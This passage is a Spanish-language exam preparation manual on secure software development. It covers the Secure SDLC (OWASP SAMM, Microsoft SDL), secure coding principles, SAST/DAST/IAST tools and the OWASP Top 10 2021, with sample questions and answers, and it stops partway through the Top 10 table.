# Manual de Preparación para el Examen de Desarrollo Seguro

## Introducción

Este manual está diseñado para proporcionar una guía completa y
detallada para la preparación del examen de desarrollo seguro. Cubre los
tópicos fundamentales y avanzados requeridos, basándose en estándares de
la industria, mejores prácticas y marcos de trabajo reconocidos. El
objetivo es ofrecer no solo el conocimiento teórico necesario, sino
también una comprensión práctica de cómo aplicar estos conceptos en el
ciclo de vida del desarrollo de software para construir aplicaciones
robustas y seguras.

La seguridad ya no es una ocurrencia tardía, sino una parte integral del
desarrollo de software. Un enfoque proactivo, que incorpore la seguridad
desde las fases iniciales del diseño hasta el despliegue y
mantenimiento, es crucial para mitigar riesgos, proteger datos sensibles
y asegurar la confianza de los usuarios. Este manual abordará los
principios, metodologías, herramientas y vulnerabilidades clave que todo
profesional del desarrollo seguro debe conocer.

## Índice

1.  [[Seguridad en el Ciclo de Vida de Desarrollo de Software
    (SDLC)]{.underline}](https://www.google.com/search?q=%231-seguridad-en-el-ciclo-de-vida-de-desarrollo-de-software-sdlc)

2.  [[Fundamentos de la Programación
    Segura]{.underline}](https://www.google.com/search?q=%232-fundamentos-de-la-programaci%C3%B3n-segura)

3.  [[Pruebas Estáticas y Dinámicas de Aplicaciones Seguras
    (SAST/DAST)]{.underline}](https://www.google.com/search?q=%233-pruebas-est%C3%A1ticas-y-din%C3%A1micas-de-aplicaciones-seguras-sastdast)

4.  [[Seguridad en Aplicaciones
    Web]{.underline}](https://www.google.com/search?q=%234-seguridad-en-aplicaciones-web)

5.  [[Desarrollo Seguro de Aplicaciones
    Móviles]{.underline}](https://www.google.com/search?q=%235-desarrollo-seguro-de-aplicaciones-m%C3%B3viles)

6.  [[Desarrollo Seguro de
    APIs]{.underline}](https://www.google.com/search?q=%236-desarrollo-seguro-de-apis)

7.  [[DevSecOps -- Desarrollo, Seguridad y
    Operaciones]{.underline}](https://www.google.com/search?q=%237-devsecops--desarrollo-seguridad-y-operaciones)

8.  [[Seguridad de la
    IA]{.underline}](https://www.google.com/search?q=%238-seguridad-de-la-ia)

## 1. Seguridad en el Ciclo de Vida de Desarrollo de Software (SDLC)

La integración de la seguridad en cada fase del Ciclo de Vida de
Desarrollo de Software (SDLC) es fundamental para construir aplicaciones
resilientes. Este enfoque proactivo, a menudo denominado \"Secure
SDLC\", busca identificar y mitigar vulnerabilidades lo antes posible,
reduciendo costos y riesgos.

### 1.1. Conceptos Fundamentales del Secure SDLC

Un SDLC seguro implica la incorporación de actividades y controles de
seguridad en todas las etapas del desarrollo, desde la concepción hasta
el retiro del software. Modelos como el **OWASP Software Assurance
Maturity Model (SAMM)** y el **Microsoft Security Development Lifecycle
(SDL)** proporcionan marcos estructurados para implementar estas
prácticas.\[1, 2\]

La **Guía del Desarrollador de OWASP** enfatiza un modelo de madurez que
abarca gobernanza, diseño, implementación, verificación y
operaciones.\[1\] Cada una de estas funciones de negocio se desglosa en
prácticas de seguridad específicas. Por ejemplo, en la fase de diseño,
se incluye el modelado de amenazas, y en la verificación, las pruebas de
seguridad.\[1\]

El **Microsoft SDL** es un proceso de aseguramiento de la seguridad que
introduce la seguridad y la privacidad en cada etapa del desarrollo,
aplicable a diversas metodologías, desde cascada hasta DevOps.\[2, 3\]
Propone prácticas como el establecimiento de estándares de seguridad, la
realización de revisiones de diseño de seguridad y modelado de amenazas,
y la ejecución de pruebas de seguridad.\[2\]

### 1.2. Fases del Secure SDLC y Actividades de Seguridad Recomendadas

Un Secure SDLC típicamente incluye las siguientes fases, con actividades
de seguridad específicas:

1.  **Formación y Concienciación:**

    - Actividad: Capacitar a los equipos de desarrollo en prácticas de
      codificación segura y en los riesgos de seguridad relevantes (ej.
      OWASP Top 10).\[1, 4\] Microsoft SDL también incluye
      \"Proporcionar capacitación en seguridad\" como una práctica
      clave.\[2\]

    - Importancia: Asegura que los desarrolladores comprendan las
      amenazas y cómo mitigarlas desde el inicio.

2.  **Requisitos:**

    - Actividad: Definir requisitos de seguridad funcionales y no
      funcionales. Realizar perfiles de riesgo y modelado de amenazas
      inicial.\[1\]

    - Importancia: Establece las bases de seguridad que la aplicación
      debe cumplir.

3.  **Diseño:**

    - Actividad: Realizar modelado de amenazas detallado para
      identificar posibles vectores de ataque y contramedidas. Aplicar
      principios de diseño seguro (ej. mínimo privilegio, defensa en
      profundidad). Seleccionar frameworks y librerías seguras.\[1, 2\]

    - Importancia: Un diseño seguro previene la introducción de fallos
      arquitectónicos que son costosos de corregir posteriormente.

4.  **Implementación (Codificación):**

    - Actividad: Seguir prácticas de codificación segura. Utilizar
      herramientas de Análisis Estático de Seguridad de Aplicaciones
      (SAST) para identificar vulnerabilidades en el código a medida que
      se escribe.\[4, 5\] Validar todas las entradas y codificar las
      salidas.\[1, 4\]

    - Importancia: Reduce la introducción de bugs de seguridad comunes
      durante la codificación.

5.  **Verificación (Pruebas):**

    - Actividad: Realizar pruebas de seguridad exhaustivas, incluyendo
      SAST, Análisis Dinámico de Seguridad de Aplicaciones (DAST),
      pruebas de penetración y revisión de código.\[1, 4\] Gestionar las
      vulnerabilidades identificadas.\[1\]

    - Importancia: Valida que los controles de seguridad implementados
      son efectivos y descubre vulnerabilidades no detectadas
      previamente.

6.  **Despliegue:**

    - Actividad: Asegurar la configuración del entorno de despliegue.
      Implementar un proceso de despliegue seguro.\[1, 6\]

    - Importancia: Previene que configuraciones incorrectas del entorno
      expongan la aplicación a riesgos.

7.  **Operaciones y Mantenimiento:**

    - Actividad: Monitorear la aplicación en producción en busca de
      actividades sospechosas y nuevas vulnerabilidades. Tener un plan
      de respuesta a incidentes. Aplicar parches de seguridad de manera
      oportuna.\[1, 2\]

    - Importancia: Asegura que la aplicación permanezca segura a lo
      largo de su vida útil frente a amenazas emergentes.

### 1.3. Modelos de Madurez de Seguridad de Software

#### 1.3.1. OWASP SAMM (Software Assurance Maturity Model)

OWASP SAMM es un marco abierto diseñado para ayudar a las organizaciones
a evaluar, formular e implementar un plan de seguridad de software que
se puede integrar en su ciclo de vida de desarrollo de software (SDL)
actual.\[7, 8\] Es agnóstico a la tecnología y al proceso, lo que
significa que puede utilizarse en una amplia gama de proyectos, desde
cascada hasta ágil y DevOps.\[7\]

SAMM se estructura en cinco **Funciones de Negocio** \[1, 8\]:

1.  **Gobernanza:** Estrategia y Métricas, Política y Cumplimiento,
    Educación y Guía.

2.  **Diseño:** Evaluación de Amenazas, Requisitos de Seguridad,
    Arquitectura Segura.

3.  **Implementación:** Construcción Segura, Despliegue Seguro, Gestión
    de Defectos.

4.  **Verificación:** Evaluación de Arquitectura, Pruebas Basadas en
    Requisitos, Pruebas de Seguridad.

5.  **Operaciones:** Gestión de Incidentes, Gestión del Entorno, Gestión
    Operacional.

Cada una de estas 15 **Prácticas de Seguridad** se divide en dos
\"flujos\", cada uno con su propio objetivo. La madurez se mide en
cuatro niveles para cada práctica \[7\]:

- **Nivel 0:** Práctica no cumplida (punto de partida implícito).

- **Nivel 1:** Comprensión básica de la práctica e implementación ad
  hoc.

- **Nivel 2:** Implementación más sistemática que mejora la eficiencia y
  eficacia de la práctica.

- **Nivel 3:** Comprensión exhaustiva de la práctica a una escala que
  permite un funcionamiento eficiente.

El objetivo de SAMM es proporcionar un mecanismo práctico y medible para
que las empresas de todos los tamaños evalúen y mejoren su postura de
seguridad del software.\[7\]

#### 1.3.2. Microsoft Security Development Lifecycle (SDL)

El Microsoft SDL es un proceso de garantía de seguridad que integra la
seguridad en cada fase del desarrollo de software.\[2, 3\] Se aplica a
todo tipo de desarrollo de software y plataformas.\[2\] El SDL
recomienda 10 prácticas de seguridad clave \[2, 6\]:

1.  Establecer estándares de seguridad, métricas y gobernanza.

2.  Requerir el uso de características, lenguajes y marcos de seguridad
    probados.

3.  Realizar revisión de diseño de seguridad y modelado de amenazas.

4.  Definir y usar estándares de criptografía.

5.  Asegurar la cadena de suministro de software.

6.  Asegurar el entorno de ingeniería.

7.  Realizar pruebas de seguridad.

8.  Garantizar la seguridad de la plataforma operativa.

9.  Implementar monitoreo y respuesta de seguridad.

10. Proporcionar capacitación en seguridad.

El SDL es un proceso evolutivo que se actualiza para aprovechar nuevas
técnicas defensivas y anticipar amenazas emergentes.\[3\]

La adopción de un SDLC seguro no es simplemente una lista de
verificación de tareas, sino un cambio cultural que prioriza la
seguridad como una responsabilidad compartida. Modelos como SAMM y SDL
proporcionan hojas de ruta valiosas, pero cada organización debe adaptar
estas prácticas a su contexto específico, riesgos y recursos. La clave
es comenzar, iterar y mejorar continuamente la postura de seguridad del
software. La implementación temprana de estas prácticas, como el
modelado de amenazas en la fase de diseño y el análisis estático durante
la codificación, es significativamente más rentable y efectiva que
intentar \"parchear\" la seguridad al final del ciclo.

### 1.4. Posibles Preguntas y Respuestas del Examen

- **P: ¿Cuál es el objetivo principal de integrar la seguridad en el
  Ciclo de Vida de Desarrollo de Software (SDLC)?**

  - R: El objetivo principal es identificar y mitigar vulnerabilidades
    de seguridad lo antes posible en el proceso de desarrollo,
    reduciendo así los riesgos, los costos de remediación y mejorando la
    resiliencia general del software.\[3, 7\]

- **P: Nombre tres fases del Microsoft SDL y una actividad de seguridad
  clave para cada una.**

  - R:

    1.  **Diseño:** Realizar revisión de diseño de seguridad y modelado
        de amenazas.

    2.  **Implementación (Código):** Requerir el uso de características,
        lenguajes y marcos de seguridad probados.

    3.  **Pruebas:** Realizar pruebas de seguridad (ej. SAST, DAST).\[2,
        6\]

- **P: ¿Cuáles son las cinco funciones de negocio definidas en el modelo
  OWASP SAMM?**

  - R: Gobernanza, Diseño, Implementación, Verificación y
    Operaciones.\[1, 8\]

- **P: Explique brevemente los niveles de madurez en OWASP SAMM.**

  - R: Nivel 0 (No cumplida), Nivel 1 (Comprensión básica e
    implementación ad hoc), Nivel 2 (Implementación sistemática que
    mejora eficiencia/eficacia), Nivel 3 (Comprensión exhaustiva a
    escala para funcionamiento eficiente).\[7\]

## 2. Fundamentos de la Programación Segura

La programación segura se basa en un conjunto de principios y prácticas
diseñados para prevenir la introducción de vulnerabilidades en el
software. Comprender estos fundamentos es esencial para cualquier
desarrollador que busque construir aplicaciones robustas y resistentes a
ataques.

### 2.1. Principios Clave de Seguridad

Varios principios guían el desarrollo de software seguro:

- **Tríada CIA (Confidencialidad, Integridad, Disponibilidad):** Estos
  son los pilares de la seguridad de la información.\[1\]

  - **Confidencialidad:** Protección de los datos contra la divulgación
    no autorizada. Asegura que solo las entidades autorizadas puedan
    acceder a la información, tanto en reposo como en tránsito.\[1\]

  - **Integridad:** Asegurar que los datos y los procesos del sistema no
    sean alterados de manera no autorizada o indebida. Mantiene la
    exactitud y completitud de la información.

  - **Disponibilidad:** Garantizar que los usuarios autorizados tengan
    acceso a la información y los recursos asociados cuando lo
    necesiten.

- **Tríada AAA (Autenticación, Autorización, Auditoría):** Complementa
  la tríada CIA.\[1\]

  - **Autenticación:** Proceso de verificar la identidad de un usuario,
    proceso o dispositivo.

  - **Autorización:** Proceso de determinar si una entidad autenticada
    tiene permiso para acceder a un recurso específico o realizar una
    acción particular.

  - **Auditoría (Accounting/Accountability):** Registro de las acciones
    realizadas por las entidades para poder rastrear actividades y
    responsabilidades.

- **Principio de Mínimo Privilegio:** Otorgar a cada proceso, usuario o
  componente solo los privilegios mínimos necesarios para realizar sus
  funciones.\[9\] Esto limita el daño potencial si un componente es
  comprometido.

- **Defensa en Profundidad:** Implementar múltiples capas de controles
  de seguridad, de modo que si una capa falla, otras puedan seguir
  protegiendo los activos.\[9, 10\] No depender de un único mecanismo de
  seguridad.

- **No Confiar en la Entrada del Usuario (Zero Trust Input):** Toda
  entrada proveniente de fuentes externas (usuarios, otros sistemas,
  archivos) debe ser considerada no confiable y validada rigurosamente
  antes de ser procesada.\[4\]

- **Seguridad por Defecto (Fail-Safe/Fail-Secure):** Los sistemas deben
  diseñarse para que, en caso de fallo, se encuentren en un estado
  seguro. Por ejemplo, si un control de acceso falla, debe denegar el
  acceso por defecto en lugar de permitirlo.\[11\]

- **Separación de Responsabilidades (Separation of Duties):** Dividir
  una tarea crítica en múltiples partes, cada una realizada por una
  persona o componente diferente, para prevenir que una sola entidad
  pueda comprometer la seguridad.

- **Simplicidad (Keep it Simple):** Diseños y mecanismos de seguridad
  complejos son más difíciles de implementar correctamente y más
  propensos a errores. La simplicidad facilita la verificación y el
  mantenimiento.

- **Seguridad a Través de la Oscuridad (Security through Obscurity) - NO
  es un Principio Válido:** Confiar en el secreto del diseño o la
  implementación como principal método de seguridad es una mala
  práctica. Los mecanismos de seguridad deben ser robustos incluso si su
  funcionamiento interno es conocido por los atacantes.\[12\]

### 2.2. Validación de Entradas y Salidas

La validación de todas las entradas es una de las defensas más cruciales
contra muchas vulnerabilidades comunes.

- **Validación de Entradas:**

  - **Por qué:** Previene ataques de inyección (SQL, XSS, Command
    Injection), desbordamientos de búfer y otros problemas causados por
    datos malformados o maliciosos.\[4, 9\] Ayuda a asegurar que los
    usuarios no puedan acceder a funciones o datos no permitidos.\[10\]

  - **Qué validar:** Tipo de dato, longitud, formato, rango, caracteres
    permitidos.

  - **Cómo:**

    - **Listas Blancas (Allow Lists):** Especificar qué entradas son
      permitidas y rechazar todo lo demás. Es preferible a las listas
      negras (deny lists).\[9, 11\]

    - **Validación del Lado del Servidor:** Siempre realizar la
      validación en el servidor. La validación del lado del cliente
      puede ser útil para la experiencia del usuario, pero puede ser
      fácilmente eludida.\[4\]

    - **Validación de Tipo de Datos:** Asegurar que los datos sean del
      tipo esperado (ej. entero, cadena, booleano).\[9\]

    - **Validación de Rango y Longitud:** Verificar que los datos
      numéricos estén dentro de un rango aceptable y que las cadenas no
      excedan las longitudes máximas.\[11\]

    - **Validación Personalizada:** Para reglas de negocio complejas
      (ej. disponibilidad de nombre de usuario).\[9\]

  - **Beneficios:** Mejora la seguridad, mantiene la integridad de los
    datos, asegura el cumplimiento de requisitos.\[9\]

- **Codificación/Sanitización de Salidas:**

  - **Por qué:** Previene ataques de Cross-Site Scripting (XSS) al
    asegurar que los datos mostrados al usuario en un navegador sean
    interpretados como texto y no como código ejecutable.\[1\]

  - **Cómo:** Utilizar funciones de codificación apropiadas para el
    contexto de salida (HTML, JavaScript, URL, CSS). Por ejemplo,
    codificar caracteres especiales como \<, \>, &, \" en entidades HTML
    (\<, \>, &, \") antes de insertarlos en HTML.

  - **Contextual Awareness:** La codificación debe ser sensible al
    contexto. La forma de escapar datos para HTML es diferente de la
    forma de escapar para atributos HTML, JavaScript, CSS o URLs.

### 2.3. Prácticas de Codificación Segura (OWASP, SANS)

Organizaciones como OWASP y SANS Institute promueven prácticas de
codificación segura para ayudar a los desarrolladores a evitar
vulnerabilidades comunes.

- **Prácticas Clave de OWASP (basadas en Top 10 Proactive Controls y
  Secure Coding Practices):**

  1.  **Definir Requisitos de Seguridad:** Desde el inicio.\[1\]

  2.  **Aprovechar Frameworks y Librerías de Seguridad:** No reinventar
      la rueda para controles comunes como CSRF protection, session
      management.\[1\]

  3.  **Asegurar el Acceso a la Base de Datos:** Usar consultas
      parametrizadas para prevenir SQLi; principio de mínimo privilegio
      para cuentas de DB.\[1, 4\]

  4.  **Codificar y Escapar Datos:** Para prevenir XSS y otras
      inyecciones.\[1, 4\]

  5.  **Validar Todas las Entradas:** Como se discutió
      anteriormente.\[1, 4\]

  6.  **Implementar Identidad Digital Segura:** Autenticación y gestión
      de sesión robustas.\[1\]

  7.  **Hacer Respetar los Controles de Acceso:** Verificar permisos en
      cada solicitud.\[1, 4\]

  8.  **Proteger los Datos en Todas Partes:** Cifrado en tránsito y en
      reposo.\[1, 4\]

  9.  **Implementar Registro y Monitoreo de Seguridad:** Para detectar y
      responder a incidentes.\[1\]

  10. **Manejar Todos los Errores y Excepciones:** De forma segura, sin
      revelar información sensible.\[1\]

- **Principios de Codificación Segura SANS/CWE:**

  - El **CWE/SANS Top 25 Most Dangerous Software Errors** es una lista
    de las debilidades de software más extendidas y críticas que pueden
    llevar a vulnerabilidades graves.\[13\]

  - Se enfoca en errores comunes como:

    - Inyección de SQL (CWE-89)

    - Cross-Site Scripting (CWE-79)

    - Desbordamiento de Búfer (CWE-120)

    - Manejo incorrecto de errores (CWE-390)

    - Uso de credenciales hardcodeadas (CWE-798)

  - La recomendación general es eliminar o mitigar las amenazas
    identificadas en OWASP Top 10 y CWE/SANS Top 25.\[13\]

  - Utilizar librerías de control de seguridad comunes y APIs que hayan
    pasado por pruebas de seguridad.\[13\]

La adopción de estos fundamentos no garantiza una seguridad absoluta, ya
que el panorama de amenazas evoluciona constantemente. Sin embargo,
reduce drásticamente la probabilidad de introducir vulnerabilidades
conocidas y establece una base sólida para construir software más
seguro. La validación de entradas, por ejemplo, no es solo una técnica,
sino una mentalidad: asumir que cualquier dato externo puede ser
malicioso hasta que se demuestre lo contrario. Esta perspectiva,
combinada con principios como el mínimo privilegio y la defensa en
profundidad, crea múltiples barreras contra los atacantes.

### 2.4. Posibles Preguntas y Respuestas del Examen

- **P: Describa la Tríada CIA y su importancia en la seguridad del
  software.**

  - R: La Tríada CIA consiste en Confidencialidad (proteger datos de
    divulgación no autorizada), Integridad (asegurar que los datos no
    sean alterados indebidamente) y Disponibilidad (garantizar el acceso
    a datos y servicios para usuarios autorizados). Es fundamental
    porque define los objetivos básicos de seguridad que cualquier
    software debe esforzarse por alcanzar.\[1\]

- **P: ¿Qué es el principio de mínimo privilegio y por qué es importante
  para la programación segura?**

  - R: El principio de mínimo privilegio establece que a un componente o
    usuario solo se le deben otorgar los permisos estrictamente
    necesarios para realizar su tarea. Es importante porque si ese
    componente es comprometido, el daño potencial se limita a los
    permisos que tenía.\[9\]

- **P: Explique la diferencia entre listas blancas y listas negras en la
  validación de entradas y cuál es preferible.**

  - R: Las listas blancas especifican explícitamente qué entradas son
    permitidas, rechazando todo lo demás. Las listas negras especifican
    qué entradas están prohibidas, permitiendo todo lo demás. Las listas
    blancas son preferibles porque son más restrictivas y menos
    propensas a omitir patrones de ataque nuevos o desconocidos.\[9,
    11\]

- **P: ¿Por qué la validación de entradas debe realizarse principalmente
  en el lado del servidor?**

  - R: La validación del lado del cliente puede ser eludida fácilmente
    por un atacante (por ejemplo, desactivando JavaScript o manipulando
    la solicitud HTTP). La validación del lado del servidor es la única
    forma confiable de asegurar que los datos maliciosos no sean
    procesados por la aplicación.\[4\]

## 3. Pruebas Estáticas y Dinámicas de Aplicaciones Seguras (SAST/DAST)

Las pruebas de seguridad de aplicaciones son un componente crucial del
Secure SDLC, diseñadas para identificar y mitigar vulnerabilidades antes
de que puedan ser explotadas. Entre las metodologías de prueba más
comunes se encuentran el Análisis Estático de Seguridad de Aplicaciones
(SAST) y el Análisis Dinámico de Seguridad de Aplicaciones (DAST).

### 3.1. SAST (Static Application Security Testing)

- **Definición:** SAST, también conocido como prueba de \"caja blanca\",
  analiza el código fuente, el código de bytes o el código binario de
  una aplicación en busca de vulnerabilidades sin ejecutar la
  aplicación.\[14, 15, 16\]

- **Cómo Funciona:** Las herramientas SAST examinan el código en busca
  de patrones de codificación inseguros, fallos de seguridad conocidos y
  violaciones de políticas de codificación segura.\[15\] Pueden
  identificar problemas como inyecciones SQL, desbordamientos de búfer,
  y vulnerabilidades de entidad externa XML (XXE).\[17, 18\]

- **Ventajas:**

  - **Detección Temprana:** Puede integrarse temprano en el SDLC,
    incluso directamente en el IDE del desarrollador, permitiendo la
    corrección de vulnerabilidades cuando es más barato y rápido
    hacerlo.\[4, 15, 18\]

  - **Cobertura del Código:** Analiza el 100% del código base al que
    tiene acceso.\[18\]

  - **No Requiere Aplicación en Ejecución:** Las pruebas se pueden
    realizar sin necesidad de un entorno de ejecución funcional.\[16\]

  - **Mejora de la Calidad del Código:** Ayuda a los desarrolladores a
    aprender y aplicar prácticas de codificación segura.\[15\]

- **Desventajas:**

  - **Falsos Positivos:** Tiende a generar más falsos positivos que DAST
    porque no tiene el contexto de ejecución de la aplicación y puede
    marcar código que, aunque parezca vulnerable de forma aislada, no lo
    es en tiempo de ejecución.\[15, 17\]

  - **Dependencia del Lenguaje:** Las herramientas SAST son específicas
    para los lenguajes de programación y frameworks utilizados.\[17\]

  - **No Detecta Vulnerabilidades en Tiempo de Ejecución:** No puede
    encontrar errores de configuración del entorno o vulnerabilidades
    que solo se manifiestan cuando la aplicación está en funcionamiento.

- **Integración en el SDLC:** Idealmente, SAST se integra en el IDE del
  desarrollador, en los sistemas de control de versiones (ej. en cada
  commit) y en el pipeline de CI/CD.\[4, 18\] Ejecutarlo solo en el
  pipeline CI/CD puede llevar a una acumulación de hallazgos que abrumen
  al equipo.\[4\]

### 3.2. DAST (Dynamic Application Security Testing)

- **Definición:** DAST, también conocido como prueba de \"caja negra\",
  examina una aplicación en su estado de ejecución, enviando entradas
  maliciosas simuladas y observando el comportamiento y las respuestas
  de la aplicación para identificar vulnerabilidades.\[14, 15, 16\] No
  requiere acceso al código fuente.\[15, 17\]

- **Cómo Funciona:** Las herramientas DAST simulan ataques externos,
  buscando vulnerabilidades como Cross-Site Scripting (XSS), inyección
  SQL, fallos de autenticación rotos, problemas de cifrado y
  configuraciones incorrectas del servidor o base de datos.\[16, 17\]

- **Ventajas:**

  - **Menos Falsos Positivos:** Generalmente produce menos falsos
    positivos que SAST porque prueba la aplicación en un estado
    operativo real.\[15, 19\]

  - **Independiente del Lenguaje:** No le importa el lenguaje o
    framework subyacente, ya que prueba desde el exterior.\[17\]

  - **Detecta Vulnerabilidades en Tiempo de Ejecución:** Puede
    identificar problemas de configuración del servidor, problemas de
    sesión y vulnerabilidades que solo aparecen cuando la aplicación
    está interactuando con otros componentes.\[16\]

- **Desventajas:**

  - **Detección Tardía:** Se realiza más tarde en el SDLC, una vez que
    hay una aplicación en funcionamiento, lo que puede hacer que la
    remediación sea más costosa.\[17\]

  - **No Cubre Todo el Código:** Solo puede probar las partes de la
    aplicación que son accesibles y ejecutables a través de sus
    interfaces externas.

  - **Puede Ser Más Lento:** Las pruebas dinámicas pueden llevar más
    tiempo que el análisis estático.\[16\]

  - **Requiere Conocimiento de Seguridad:** Interpretar los informes
    DAST puede requerir cierto conocimiento de seguridad.\[16\]

- **Integración en el SDLC:** DAST se utiliza típicamente durante la
  fase de pruebas, después de que la aplicación esté operativa en un
  entorno de prueba, o incluso en producción (con precaución).\[15, 17\]
  También se puede integrar en pipelines de CI/CD para pruebas continuas
  de aplicaciones desplegadas.\[16\]

### 3.3. IAST (Interactive Application Security Testing)

- **Definición:** IAST combina elementos de SAST y DAST, operando desde
  dentro de la aplicación en ejecución (a menudo mediante agentes
  instrumentados) para identificar vulnerabilidades en tiempo real
  mientras la aplicación es utilizada (por probadores manuales,
  herramientas DAST automatizadas, etc.).\[15\]

- **Ventajas:**

  - **Cobertura Completa:** Combina análisis estáticos y
    dinámicos.\[15\]

  - **Detección en Tiempo Real:** Identifica vulnerabilidades mientras
    la aplicación se usa.\[15\]

  - **Menos Falsos Positivos y Mayor Precisión:** Al tener acceso tanto
    al código como al contexto de ejecución, puede ser más
    preciso.\[15\]

  - **Visibilidad del Flujo de Datos:** Puede rastrear cómo los datos
    fluyen a través de la aplicación.

- **Desventajas:**

  - **Impacto en el Rendimiento:** La instrumentación puede afectar el
    rendimiento de la aplicación durante las pruebas.\[15\]

  - **Costos y Complejidad:** Puede tener mayores costos de
    implementación y operación.\[15\]

- **Integración en el SDLC:** Se integra de forma continua durante todo
  el proceso de desarrollo y pruebas, especialmente en entornos de QA y
  staging.\[15\]

### 3.4. Comparativa SAST vs. DAST

  ----------------------- ----------------------- -----------------------
  **Característica**      **SAST (Caja Blanca)**  **DAST (Caja Negra)**

  **Qué Escanea**         Código fuente,          Aplicación en
                          bytecode, binarios      ejecución, APIs \[17\]
                          \[17\]                  

  **Cuándo Escanea**      Temprano en el SDLC     Tarde en el SDLC
                          (codificación, commit)  (pruebas,
                          \[17\]                  post-despliegue) \[17\]

  **Acceso al Código**    Requerido \[17\]        No requerido \[17\]

  **Falsos Positivos**    Más propensos \[16,     Menos propensos \[16,
                          17\]                    19\]

  **Falsos Negativos**    Menos propensos (para   Más propensos (si no se
                          lo que cubre) \[16\]    prueba el flujo) \[16\]

  **Dependencia           Específico del lenguaje Independiente del
  Lenguaje**              \[17\]                  lenguaje \[17\]

  **Vulnerabilidades**    Errores de              XSS, SQLi (reales),
                          codificación,           config. incorrectas,
                          inyecciones             auth rota \[17\]
                          (potenciales),          
                          desbordamientos \[17\]  

  **Velocidad**           Generalmente más rápido Puede ser más lento
                          \[16\]                  \[16\]
  ----------------------- ----------------------- -----------------------

### 3.5. Herramientas SAST y DAST (Open Source y Comerciales)

Existe una amplia gama de herramientas SAST y DAST, tanto de código
abierto como comerciales.

- **Herramientas SAST Open Source:**

  - **GolangCI-Lint:** Para proyectos Go, usa múltiples linters.\[20\]

  - **PHPStan:** Analizador de código PHP popular.\[20\]

  - **Brakeman:** Analizador estático para Ruby on Rails (detecta SQLi,
    XSS).\[20\]

  - **Bandit:** Analizador de código Python para problemas de seguridad
    comunes.\[20\]

  - **PMD:** Analizador estático multilingüe (más de 15
    lenguajes).\[20\]

  - **SonarQube (con plugins de seguridad):** Plataforma para la calidad
    continua del código, puede realizar análisis SAST.

- **Herramientas DAST Open Source:**

  - **OWASP ZAP (Zed Attack Proxy):** Una herramienta DAST muy popular y
    completa, mantenida por OWASP.\[21\]

  - **Arachni:** Framework de escaneo de seguridad web.

- **Herramientas Comerciales (pueden ofrecer SAST, DAST, IAST, SCA):**

  - Parasoft (SAST, DAST) \[4, 18\]

  - Veracode (SAST, DAST, SCA) \[22, 23\]

  - Checkmarx (SAST, DAST, IAST, SCA) \[22\]

  - HCL AppScan (SAST, DAST, IAST)

  - Qualys Web Application Scanning

  - Invicti (antes Netsparker) (DAST) \[24\]

  - GitLab Ultimate (SAST, DAST, Dependency Scanning, Secret Detection)
    \[23, 25\]

  - Snyk (SCA, SAST) \[22\]

  - JFrog Xray (SCA) \[22\]

La elección entre SAST, DAST e IAST no es excluyente. De hecho, una
estrategia de seguridad de aplicaciones madura a menudo emplea una
combinación de estas herramientas y técnicas en diferentes etapas del
SDLC.\[15, 17\] SAST proporciona retroalimentación temprana a los
desarrolladores, DAST valida la seguridad de la aplicación en un entorno
de ejecución, e IAST puede ofrecer una visión más profunda durante las
pruebas funcionales. La clave es integrar estas pruebas de manera que
proporcionen información procesable sin abrumar a los equipos de
desarrollo, fomentando una cultura de seguridad proactiva.\[17, 18\]

### 3.6. Posibles Preguntas y Respuestas del Examen

- **P: ¿Cuál es la principal diferencia entre SAST y DAST en términos de
  cómo analizan una aplicación?**

  - R: SAST analiza el código fuente o binario de la aplicación sin
    ejecutarla (prueba de caja blanca), mientras que DAST prueba la
    aplicación mientras está en ejecución, interactuando con ella como
    lo haría un usuario o atacante (prueba de caja negra).\[14, 17\]

- **P: Mencione una ventaja y una desventaja de SAST.**

  - R: Ventaja: Detección temprana de vulnerabilidades en el SDLC.
    Desventaja: Mayor propensión a falsos positivos debido a la falta de
    contexto de ejecución.\[15, 18\]

- **P: ¿En qué fase del SDLC se suele utilizar DAST y por qué?**

  - R: DAST se utiliza típicamente en la fase de pruebas o incluso en
    producción (con precaución), porque requiere que la aplicación esté
    en un estado de ejecución para simular ataques reales y observar su
    comportamiento.\[15, 17\]

- **P: ¿Qué tipo de vulnerabilidades es más probable que detecte DAST
  que SAST no pueda encontrar?**

  - R: DAST es más probable que detecte vulnerabilidades relacionadas
    con el entorno de ejecución, como errores de configuración del
    servidor, problemas de gestión de sesión y vulnerabilidades que solo
    se manifiestan cuando la aplicación interactúa con otros sistemas o
    datos en tiempo real.\[16, 17\]

## 4. Seguridad en Aplicaciones Web

Las aplicaciones web son objetivos frecuentes de ataques debido a su
accesibilidad y la valiosa información que a menudo manejan. El Open Web
Application Security Project (OWASP) es una comunidad fundamental que
proporciona recursos para mejorar la seguridad de las aplicaciones web,
siendo su proyecto más conocido el OWASP Top 10.

### 4.1. Introducción al OWASP Top 10

El **OWASP Top 10** es un documento de concienciación estándar para
desarrolladores y seguridad de aplicaciones web. Representa un amplio
consenso sobre los riesgos de seguridad más críticos para las
aplicaciones web.\[4\] Se actualiza periódicamente para reflejar los
cambios en el panorama de amenazas. Su objetivo es ayudar a las
organizaciones a centrarse en los problemas de seguridad clave y
comprender su impacto.\[4\] Es un excelente punto de partida si una
organización está comenzando con la seguridad de aplicaciones o si sus
esfuerzos han sido ad-hoc.\[4\]

### 4.2. Tabla Resumen OWASP Top 10 2021

La versión más reciente referenciada en el material de investigación es
la de 2021.

  ----------------------- ----------------------- -----------------------
  **ID**                  **Nombre del Riesgo     **Breve Descripción del
                          (2021)**                Riesgo**

  A01:2021                Broken Access Control   Restricciones sobre lo
                          (Control de Acceso      que los usuarios
                          Roto)                   autenticados pueden
                                                  hacer no se aplican
                                                  correctamente.

  A02:2021                Cryptographic Failures  Fallos relacionados con
                          (Fallos Criptográficos) la criptografía (o su
                                                  ausencia) que a menudo
                                                  conducen a la
                                                  exposición de datos
                                                  sensibles.

  A03:2021                Injection (Inyección)   Fallos que permiten a
                                                  los atacantes enviar
                                                  datos hostiles a un
                                                  intérprete (SQL, OS,
                                                  XSS, etc.).

  A04:2021                Insecure Design (Diseño Fallos relacionados con
                          Inseguro)               el diseño y la
                                                  arquitectura, donde los
                                                  controles de seguridad
                                                  necesarios faltan o son
                                                  ineficaces.

  A05:2021                Security                Configuraciones de
                          Misconfiguration        seguridad ausentes,
                          (Configuración de       incompletas o
                          Seguridad Incorrecta)   incorrectas.

  A06:2021                Vulnerable and Outdated Uso de componentes
                          Components (Componentes (librerías, frameworks)
                          Vulnerables y           con vulnerabilidades
                          Desactualizados)        conocidas.

  A07:2021                Identification and      Funciones relacionadas
                          Authentication Failures con la identidad,
                          (Fallos de              autenticación y gestión
                          Identificación y        de sesiones
